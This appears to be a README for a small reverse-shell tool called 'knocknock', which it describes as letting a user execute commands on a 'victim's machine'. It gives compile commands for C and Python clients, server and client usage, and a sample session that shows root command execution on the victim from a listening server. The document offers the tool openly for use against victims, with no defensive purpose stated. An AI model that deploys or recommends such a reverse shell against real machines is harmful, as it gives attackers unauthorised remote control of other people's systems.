> ![](cmd.ico) A Tiny REVERSE CONSOLE that allows you excute command on victim's machine.
>
> Python version Support both Python 2 & 3, no thirdpart dependencies.
> There is also a C version client side program Support Linux & Windows.
> WARN: (Server <=> Client communications not encrypted)


### Compile C version `knocknock.c`
```bash
# Windows CL
$> cl knocknock.c /O1 /D WIN32 /link /subsystem:console
# Windows or Linux gcc
$> gcc -Wall -O1 knocknock.c -o knocknock
```

### How To Use?
```bash
$> ./server.py bind_address:bind_port
$> ./knocknock.py server_ip:server_port[:retry_interval]

# Server Example
$> ./server.py 127.0.0.1:4433

# Client Example (C version has the same argument)
$> ./knocknock.py 127.0.0.1:4433 # default retry interval 60 seconds
$> ./knocknock.py 127.0.0.1:4433:60
```

## Example
#### Your Machine
```bash
root@server 07:47 /home $ ./server 0.0.0.0:2345
listen on 0.0.0.0:2345, waiting for connection.
connection from *.*.*.*:49006
$> whoami
root

$> ls -la
total 16
drwxr-xr-x  3 root root 4096 Feb 11 07:31 .
drwxr-xr-x 22 root root 4096 Jan 30 09:55 ..
-rwxr-xr-x  1 root root  532 Feb 11 07:31 knocknock
drwxr-xr-x  5 git  git  4096 Jan  3 08:41 jack

$>
```

#### Victim's Machine
```bash
root@boy 07:47 /home $ ./knocknock *.*.*.*:2345
```
End.
